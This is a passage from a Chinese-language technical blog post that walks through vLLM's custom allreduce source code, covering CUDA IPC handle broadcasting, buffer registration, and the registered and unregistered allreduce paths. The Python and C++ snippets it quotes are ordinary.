class="hljs-keyword">def</span> <span class="hljs-title function_">_all_reduce_out_place</span>(<span class="hljs-params">self, input_: torch.Tensor</span>) -&gt; torch.Tensor:<br>    ca_comm = self.ca_comm<br>    out = ca_comm.custom_all_reduce(input_)<br>    <span class="hljs-keyword">return</span> out<br></code></pre></td></tr></table></figure><h3 id="allreduce-使用前提">allreduce 使用前提</h3><p>现在，我们再来仔细看 <a href="https://github.com/vllm-project/vllm/blob/v0.6.3/vllm/distributed/device_communicators/custom_all_reduce.py#L46"><code>CustomAllreduce</code></a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomAllreduce</span>:<br>    _SUPPORTED_WORLD_SIZES = [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>]<br><br>    <span class="hljs-comment"># max_size: max supported allreduce size</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,</span><br><span class="hljs-params">                 group: ProcessGroup,</span><br><span class="hljs-params">                 device: <span class="hljs-type">Union</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>, torch.device],</span><br><span class="hljs-params">                 max_size=<span class="hljs-number">8192</span> * <span class="hljs-number">1024</span></span>) -&gt; <span class="hljs-literal">None</span>:<br></code></pre></td></tr></table></figure><p>可以确定， Custom Allreduce 特性仅支持在 2，4，6，8 卡上推理时才能打开，并且最大支持的 allreduce size 为 8 MB。这里的 allreduce size 指的是 MLP 在各个 GPU 上计算出来的张量大小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomAllreduce</span>:<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_all_reduce</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>: torch.Tensor</span>) -&gt; <span class="hljs-type">Optional</span>[torch.Tensor]:<br>        <span class="hljs-keyword">if</span> self.disabled <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> self.should_custom_ar(<span class="hljs-built_in">input</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">if</span> self._IS_CAPTURING:<br>            <span class="hljs-keyword">if</span> torch.cuda.is_current_stream_capturing():<br>                <span class="hljs-keyword">return</span> self.all_reduce_reg(<span class="hljs-built_in">input</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># if warm up, mimic the allocation pattern</span><br>                <span class="hljs-comment"># since custom allreduce is out-of-place</span><br>                <span class="hljs-keyword">return</span> torch.empty_like(<span class="hljs-built_in">input</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># note: outside of cuda graph context,</span><br>            <span class="hljs-comment"># custom allreduce incurs a cost of cudaMemcpy, which should</span><br>            <span class="hljs-comment"># be small(&lt;=1% of overall latency) compared to the performance</span><br>            <span class="hljs-comment"># gains of using custom kernels</span><br>            <span class="hljs-keyword">return</span> self.all_reduce_unreg(<span class="hljs-built_in">input</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>若我们打开 custom allreduce 特性，<code>custom_all_reduce</code> 会先执行 <code>should_custom_ar</code> ，之后的逻辑可以分为三条</p><ul><li>一条是 <code>self._IS_CAPTURING</code> 为 True，使用 <code>all_reduce_reg</code>，在 CUDA graph capture 该 stream 流调用</li><li>一条是 <code>self._IS_CAPTURING</code> 为 False，使用 <code>all_reduce_unreg</code>，在不是 CUDA graph 或者 CUDA graph 未 capture stream 流调用</li><li>最后是 warm up 时的计算，可以忽略</li></ul><p>先来看 <code>should_custom_ar</code> 来确定 allreduce 的使用前提：</p><ul><li>一条是 <code>self._IS_CAPTURING</code> 为 False，使用 <code>all_reduce_unreg</code></li><li>最后是 warm up 时的计算，可以忽略。</li></ul><p>这两个函数 <code>all_reduce</code> 函数我们先按下不表，我们先来看 <code>should_custom_ar</code> 来确定 allreduce 的使用前提：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">should_custom_ar</span>(<span class="hljs-params">self, inp: torch.Tensor</span>):<br>    <span class="hljs-keyword">if</span> self.disabled:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    inp_size = inp.numel() * inp.element_size()<br>    <span class="hljs-comment"># custom allreduce requires input byte size to be multiples of 16</span><br>    <span class="hljs-keyword">if</span> inp_size % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_weak_contiguous(inp):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># for 4 or more non NVLink-capable GPUs, custom allreduce provides</span><br>    <span class="hljs-comment"># little performance improvement over NCCL.</span><br>    <span class="hljs-keyword">if</span> self.world_size == <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> self.full_nvlink:<br>        <span class="hljs-keyword">return</span> inp_size &lt; self.max_size<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>不难发现，<code>should_custom_ar</code> 在如下条件会返回 False，allreduce 传输的 tensor 大小不是 16 对齐的，或者不是弱连续（连续或有前置偏移的连续），或者运行环境中有四张以上的非 NVLink 的 GPU 卡。</p><p>总结一下，Custom allreduce 特性在如下条件全部满足方可使用：</p><ul><li>用户没有手动 disable，即未传入 <code>disable_custom_all_reduce=True</code></li><li>机器上有 2，4，6，8 GPU 卡，且当有四张及以上的卡时，他们必须使用 NVLink 连接</li><li>allreduce 的张量大小不超过 8 MB，必须 16 Byte 对齐，必须满足连续条件</li></ul><h3 id="Python-到-C">Python 到 C++</h3><p>之前我们提到，vllm kernel 内的通信数据，是通过每个节点上的 CUDA IPC buffer 来交流实现的。本着怀疑主义的精神，我们来深入追踪一下，当前节点下的 CUDA 进程如何获得其他节点的 IPC buffer 的指针的。</p><p>其关键就藏匿于下面的<a href="https://github.com/vllm-project/vllm/blob/v0.6.3/vllm/distributed/device_communicators/custom_all_reduce.py#L148-L175">代码</a>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># buffers memory are owned by this Python class and passed to C++</span><br><span class="hljs-comment"># meta data composes of two parts: meta data for synchronization</span><br><span class="hljs-comment"># (256 bytes) and a temporary buffer for storing intermediate</span><br><span class="hljs-comment"># allreduce results.</span><br>self.meta = torch.zeros(ops.meta_size() + max_size,<br>                        dtype=torch.uint8,<br>                        device=self.device)<br><span class="hljs-comment"># This is a pre-registered IPC buffer. In eager mode, input tensors</span><br><span class="hljs-comment"># are first copied into this buffer before allreduce is performed</span><br>self.buffer = torch.empty(max_size,<br>                            dtype=torch.uint8,<br>                            device=self.device)<br><span class="hljs-comment"># This is a buffer for storing the tuples of pointers pointing to</span><br><span class="hljs-comment"># IPC buffers from all ranks. Each registered tuple has size of</span><br><span class="hljs-comment"># 8*world_size bytes where world_size is at most 8. Allocating 8MB</span><br><span class="hljs-comment"># is enough for 131072 such tuples. The largest model I&#x27;ve seen only</span><br><span class="hljs-comment"># needs less than 10000 of registered tuples.</span><br>self.rank_data = torch.empty(<span class="hljs-number">8</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>,<br>                                dtype=torch.uint8,<br>                                device=self.device)<br>self.max_size = max_size<br>self.rank = rank<br>self.world_size = world_size<br></code></pre></td></tr></table></figure><p>逐一地解释一下这些变量，因为它会在下面的篇幅中反复出现，准确地理解它对我们读懂 vllm custom allreduce 实现至关重要。</p><ul><li><code>meta</code> Python 类 owned 的 buffers，可以理解为整个 Python 类的所有字节，包括两部分，用于 GPU 间数据通信的 256 字节和用于暂存 allreduce 数据的 buffer</li><li><code>buffer</code> 用于在该节点上的 CUDA IPC 的暂存数据的 buffer</li><li><code>rank_data</code> 用于接受来自其他节点 CUDA IPC 数据的 buffer</li><li><code>rank</code> 当前节点号</li><li><code>world_size</code> 目前机器下的 GPU 总数</li></ul><h2 id="C-CustomAllreduce">C++ CustomAllreduce</h2><p>后续的指令做了非常重要的几件事，我们一个一个来看：</p><h3 id="通过-CPU-广播所有节点的-IPC-handles">通过 CPU 广播所有节点的 IPC handles</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">handles, offsets = self._get_ipc_meta(self.meta)<br>self.full_nvlink = full_nvlink<br>self._ptr = ops.init_custom_ar(self.meta, self.rank_data, handles,<br>                                offsets, rank, self.full_nvlink)<br>self.register_buffer(self.buffer)<br></code></pre></td></tr></table></figure><p><code>_get_ipc_meta</code> 通过在 CPU 上调用 <code>torch.distributed.broadcast_object_list</code> 的广播手段，使得</p><ul><li><code>handles</code> 获得了<strong>所有其他节点的 ipc handler 指针</strong></li><li><code>offsets</code> 获得了<strong>ipc buffer 下接受来自其他节点数据的目标位置偏移量</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_ipc_meta</span>(<span class="hljs-params">self, inp: torch.Tensor</span>):<br>    data = inp.untyped_storage()._share_cuda_()<br>    shard_data = (<br>        data[<span class="hljs-number">1</span>],  <span class="hljs-comment"># ipc handle to base ptr</span><br>        data[<span class="hljs-number">3</span>],  <span class="hljs-comment"># offset of base ptr</span><br>    )<br>    <span class="hljs-keyword">return</span> self._gather_ipc_meta(shard_data)<br></code></pre></td></tr></table></figure><p>一开始我很是不能理解为什么 data[1] 和 data[3] 分别对应 ipc handle 和 offset ，后来我参考了 <a href="https://github.com/pytorch/pytorch/blob/main/torch/csrc/StorageSharing.cpp#L353">torch/csrc<br>/StorageSharing.cpp 的源码</a>才明白这其中的安排🤭。因为其中的 tuple 1 就是 <code>cudaIpcMemHandle_t</code> handle，3 就是真正 storage 的偏移量的字节数。</p><h3 id="创建与初始化-C-CustomAllreduce">创建与初始化 C++ CustomAllreduce</h3><p><code>ops.init_custom_ar</code> 创建并初始化了 C++ <code>CustomAllreduce</code>。</p><p><code>ops.init_custom_ar</code> 通过 pytorch 的 <code>TORCH_LIBRARY_EXPAND</code>  C++ 扩展（这是用于自定义算子的一个宏）来调用 backend 的 C++ 代码，也就是对应到了下面的 C++ 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">fptr_t</span> <span class="hljs-title">init_custom_ar</span><span class="hljs-params">(torch::Tensor&amp; meta, torch::Tensor&amp; rank_data,</span></span><br><span class="hljs-params"><span class="hljs-function">                      <span class="hljs-type">const</span> std::vector&lt;std::string&gt;&amp; handles,</span></span><br><span class="hljs-params"><span class="hljs-function">                      <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int64_t</span>&gt;&amp; offsets, <span class="hljs-type">int64_t</span> rank,</span></span><br><span class="hljs-params"><span class="hljs-function">                      <span class="hljs-type">bool</span> full_nvlink)</span> </span>&#123;<br>  <span class="hljs-type">int</span> world_size = offsets.<span class="hljs-built_in">size</span>();<br>  cudaIpcMemHandle_t ipc_handles[<span class="hljs-number">8</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; world_size; i++) &#123;<br>    std::<span class="hljs-built_in">memcpy</span>(&amp;ipc_handles[i], handles[i].<span class="hljs-built_in">data</span>(), <span class="hljs-built_in">sizeof</span>(cudaIpcMemHandle_t));<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">fptr_t</span>) <span class="hljs-keyword">new</span> vllm::<span class="hljs-built_in">CustomAllreduce</span>(<br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;vllm::Signal*&gt;(meta.<span class="hljs-built_in">data_ptr</span>()), rank_data.<span class="hljs-built_in">data_ptr</span>(),<br>      rank_data.<span class="hljs-built_in">numel</span>(), ipc_handles, offsets, rank, full_nvlink);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的实现意思很简单，把之前从 CPU 广播拿到的 <code>handles</code> 放入到 <code>CustomAllreduce</code> 类内管理。</p><p>随后就是初始化 <code>CustomAllreduce</code>。该类内部的数组 <code>sg_</code> 最多有 8 个 <code>vllm::Signal</code> 指针，他们分别指向所有 GPU 节点上 <code>CustomAllreduce</code> 的 <code>meta</code> 内存（通过 CUDA IPC handles 和自己内部指针）。</p><p>而为了保证收发不会互相影响或产生死锁，<code>vllm::Signal</code> 将收发数组分开了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> kMaxBlocks = <span class="hljs-number">36</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Signal</span> &#123;<br>  <span class="hljs-built_in">alignas</span>(<span class="hljs-number">128</span>) FlagType self_counter[kMaxBlocks][<span class="hljs-number">8</span>];<br>  <span class="hljs-built_in">alignas</span>(<span class="hljs-number">128</span>) FlagType peer_counter[<span class="hljs-number">2</span>][kMaxBlocks][<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CustomAllreduce</span>(Signal* meta, <span class="hljs-type">void</span>* rank_data, <span class="hljs-type">size_t</span> rank_data_sz,<br>                <span class="hljs-type">const</span> cudaIpcMemHandle_t* handles,<br>                <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int64_t</span>&gt;&amp; offsets, <span class="hljs-type">int</span> rank,<br>                <span class="hljs-type">bool</span> full_nvlink = <span class="hljs-literal">true</span>)<br>    : <span class="hljs-built_in">rank_</span>(rank), <span class="hljs-built_in">world_size_</span>(offsets.<span class="hljs-built_in">size</span>()),<br>    <span class="hljs-built_in">full_nvlink_</span>(full_nvlink), <span class="hljs-built_in">self_sg_</span>(meta),<br>    <span class="hljs-built_in">d_rank_data_base_</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;RankData*&gt;(rank_data)),<br>    <span class="hljs-built_in">d_rank_data_end_</span>(d_rank_data_base_ + rank_data_sz / <span class="hljs-built_in">sizeof</span>(RankData)) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; world_size_; i++) &#123;<br>        Signal* rank_sg;<br>        <span class="hljs-keyword">if</span> (i != rank_) &#123;<br>            <span class="hljs-type">char</span>* handle = <span class="hljs-built_in">open_ipc_handle</span>(&amp;handles[i]);<br>            handle += offsets[i];<br>            rank_sg = (Signal*)handle;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            rank_sg = self_sg_;<br>        &#125;<br>        sg_.signals[i] = rank_sg;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数 <code>open_ipc_handle</code> 的实现可以参考 CUDA IPC API的<a href="https://docs.nvidia.com/cuda/cuda-runtime-api/group__CUDART__DEVICE.html#group__CUDART__DEVICE_1g01050a29fefde385b1042081ada4cde9">使用说明</a>。最后，返回的 <code>char* handle</code> 再加上之前获得的偏移量，就可以直接指向真正存放 storage 数据的内存位置了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">open_ipc_handle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* ipc_handle)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> [it, new_handle] =<br>    ipc_handles_.<span class="hljs-built_in">insert</span>(&#123;*((IPC_KEY*)ipc_handle), <span class="hljs-literal">nullptr</span>&#125;);<br>  <span class="hljs-keyword">if</span> (new_handle) &#123;<br>    <span class="hljs-type">char</span>* ipc_ptr;<br>    <span class="hljs-built_in">CUDACHECK</span>(<span class="hljs-built_in">cudaIpcOpenMemHandle</span>((<span class="hljs-type">void</span>**)&amp;ipc_ptr,<br>                                    *((<span class="hljs-type">const</span> cudaIpcMemHandle_t*)ipc_handle),<br>                                    cudaIpcMemLazyEnablePeerAccess));<br>    it-&gt;second = ipc_ptr;<br>  &#125;<br>  <span class="hljs-keyword">return</span> it-&gt;second;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注册-IPC-buffer">注册 IPC buffer</h3><p><code>register_buffer</code> 函数完成了 CUDA IPC buffer 的注册。</p><p>下面的 C++ 代码会被执行。注意到在程序的最后是 buffer 完成注册最关键的一步：程序会将 <code>handles</code> + <code>offset</code> 全部都 copy 到 <code>d_rank_data_base_</code> 指向的内存，结合 <code>CustomAllreduce</code> 的初始化过程，可以知道这就是将指向用于 allreduce 数据交换的内存的指针移动到了 <code>rank_data</code> 内。</p><p>程序最后的 <code>buffers_</code> 则记录了一张表格，存放着本节点 <code>buffer</code> 与 <code>rank_data</code> 的对应关系。这一步完成之后，本节点的 GPU 就可以通过 <code>buffer</code> 的指针，获知其他 GPU 的对应 <code>buffer</code> 的 IPC 交换地址，那这样也就完成了 register。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// here Tensor t is self.buffer in python</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">register_buffer</span><span class="hljs-params">(<span class="hljs-type">fptr_t</span> _fa, torch::Tensor&amp; t,</span></span><br><span class="hljs-params"><span class="hljs-function">                     <span class="hljs-type">const</span> std::vector&lt;std::string&gt;&amp; handles,</span></span><br><span class="hljs-params"><span class="hljs-function">                     <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int64_t</span>&gt;&amp; offsets)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> fa = <span class="hljs-built_in">reinterpret_cast</span>&lt;vllm::CustomAllreduce*&gt;(_fa);<br>  fa-&gt;<span class="hljs-built_in">register_buffer</span>(handles, offsets, t.<span class="hljs-built_in">data_ptr</span>());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">register_buffer</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;std::string&gt;&amp; handles,</span></span><br><span class="hljs-params"><span class="hljs-function">                     <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int64_t</span>&gt;&amp; offsets, <span class="hljs-type">void</span>* self)</span> </span>&#123;<br>    <span class="hljs-built_in">check_rank_data_capacity</span>();<br>    RankData data;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; world_size_; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i != rank_) &#123;<br>            <span class="hljs-type">char</span>* handle = <span class="hljs-built_in">open_ipc_handle</span>(handles[i].<span class="hljs-built_in">data</span>());<br>            handle += offsets[i];<br>            data.ptrs[i] = handle;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            data.ptrs[i] = self;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">auto</span> d_data = d_rank_data_base_++;<br>    <span class="hljs-built_in">CUDACHECK</span>(<span class="hljs-built_in">cudaMemcpy</span>(d_data, &amp;data, <span class="hljs-built_in">sizeof</span>(RankData), cudaMemcpyHostToDevice));<br>    buffers_[self] = d_data;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="all-reduce-reg-与-all-reduce-unreg">all_reduce_reg 与 all_reduce_unreg</h3><p>明白了 <code>CustomAllreduce</code> 中的注册意义后，再来看之前提到的两个 <code>all_reduce_(un)reg</code> 函数就能更好地理解。</p><ul><li><code>all_reduce_reg</code> 在使用前就已经默认输入的 <code>inp</code> 已经完成注册；</li><li><code>all_reduce_unreg</code> 则需要先将 <code>inp</code> 的数据拷贝到完成注册的 <code>self.buffer</code>，再做 allreduce。</li></ul><p>所以，<code>all_reduce_unreg</code> 函数会多一次 <code>cudaMemcpy</code>，幸好这个数据拷贝损失的性能代价不大。它会在 CUDA graph context 外时被调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># all reduce, assuming inp tensor is IPC registered with register_buffer,</span><br><span class="hljs-comment"># or, in the context of cuda graphs, register_graph_buffers</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">all_reduce_reg</span>(<span class="hljs-params">self, inp: torch.Tensor, out: torch.Tensor = <span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        out = torch.empty_like(inp)<br>    ops.all_reduce_reg(self._ptr, inp, out)<br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-comment"># all reduce, assuming inp tensor is NOT IPC registered</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">all_reduce_unreg</span>(<span class="hljs-params">self, inp: torch.Tensor, out: torch.Tensor = <span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> out <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        out = torch.empty_like(inp)<br>    ops.all_reduce_unreg(self._ptr, inp, self.buffer, out)<br>    <span class="hljs-keyword">return</span> out<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">all_reduce_unreg</span><span class="hljs-params">(<span class="hljs-type">fptr_t</span> _fa, torch::Tensor&amp; inp, torch::Tensor&amp; reg_buffer,</span></span><br><span class="hljs-params"><span class="hljs-function">                      torch::Tensor&amp; out)</span> </span>&#123;<br>  <span class="hljs-type">const</span> at::<span class="hljs-function">cuda::OptionalCUDAGuard <span class="hljs-title">device_guard</span><span class="hljs-params">(device_of(inp))</span></span>;<br>  <span class="hljs-keyword">auto</span> stream = c10::cuda::<span class="hljs-built_in">getCurrentCUDAStream</span>().<span class="hljs-built_in">stream</span>();<br>  <span class="hljs-keyword">auto</span> input_size = inp.<span class="hljs-built_in">numel</span>() * inp.<span class="hljs-built_in">element_size</span>();<br>  <span class="hljs-comment">// async copy the inp to self.buffer</span><br>  <span class="hljs-built_in">AT_CUDA_CHECK</span>(<span class="hljs-built_in">cudaMemcpyAsync</span>(reg_buffer.<span class="hljs-built_in">data_ptr</span>(), inp.<span class="hljs-built_in">data_ptr</span>(),<br>                                input_size, cudaMemcpyDeviceToDevice, stream));<br>  _all_reduce(_fa, reg_buffer, out, stream);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单起见，我们重点来看 <code>all_reduce_unreg</code> 这一个的实现，它将输入的 <code>inp</code> 数据拷贝给 <code>self.buffer</code> 后，就会调用 <code>_all_reduce</code> 函数来完成 allreduce。</p><h3 id="allreduce-实现">allreduce 实现</h3><p><code>_all_reduce</code> 函数只是一个启动器，它会依照输入输出的数据类型启动 <code>CustomAllreduce::allreduce</code> 函数。接下来我们重点研究一下 <code>allreduce</code> 函数：</p><p>先来看其中的第一部分，该部分与之前的注册 IPC buffer 内容紧密相关。回顾前文，<code>CustomAllreduce::buffers_</code> 内存放着本节点 <code>buffer</code> 与 <code>rank_data</code> 的对应关系，于是获得的 <code>ptrs</code> 就是指向了 8 个 <code>rank_data</code> 内存的指针数组。当然，还有一种情况是不在当前上下文，那么需要从 <code>d_rank_data_base_</code> 取出对应 <code>rank_data</code> 的指针数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">allreduce</span><span class="hljs-params">(cudaStream_t stream, T* input, T* output, <span class="hljs-type">int</span> size,</span></span><br><span class="hljs-params"><span class="hljs-function">               <span class="hljs-type">int</span> threads = <span class="hljs-number">512</span>, <span class="hljs-type">int</span> block_limit = <span class="hljs-number">36</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> d = <span class="hljs-type">packed_t</span>&lt;T&gt;::P::size;<br>  <span class="hljs-comment">// ...</span><br>  RankData* ptrs;<br>  cudaStreamCaptureStatus status;<br>  <span class="hljs-built_in">CUDACHECK</span>(<span class="hljs-built_in">cudaStreamIsCapturing</span>(stream, &amp;status));<br>  <span class="hljs-keyword">if</span> (status == cudaStreamCaptureStatusActive) &#123;<br>    ptrs = d_rank_data_base_ + graph_unreg_buffers_.<span class="hljs-built_in">size</span>();<br>    graph_unreg_buffers_.<span class="hljs-built_in">push_back</span>(input);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">auto</span> it = buffers_.<span class="hljs-built_in">find</span>(input);<br>    <span class="hljs-keyword">if</span> (it == buffers_.<span class="hljs-built_in">end</span>())<br>      <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(...)<br>    ptrs = it-&gt;second;<br>  &#125;<br></code></pre></td></tr></table></figure><p>取出对应了其他节点 handle 指针后，下一步就是开始 Allreduce 操作了。下面的代码会分情况调用 <code>cross_device_reduce_1stage</code> 或者 <code>cross_device_reduce_2stage</code>。从代码看，对于小节点数小 size 